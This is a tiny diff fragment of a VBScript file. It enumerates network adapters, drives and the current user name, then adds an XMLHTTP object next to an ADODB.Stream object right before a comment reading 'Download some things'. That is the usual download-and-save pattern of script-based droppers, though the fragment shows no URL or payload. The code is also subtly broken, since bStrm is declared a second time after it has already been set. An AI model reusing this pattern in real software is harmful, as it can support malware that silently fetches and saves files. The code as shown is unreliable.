@@ -31,6 +31,8 @@
     "SELECT * FROM Win32_NetworkAdapter Where NetEnabled = 'True'")
     Set bStrm = createobject("Adodb.Stream")
     Set dc = fso.Drives
+    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+    dim bStrm: Set bStrm = createobject("Adodb.Stream")
     strUser = CreateObject("WScript.Network").UserName
 
     Rem Download some things
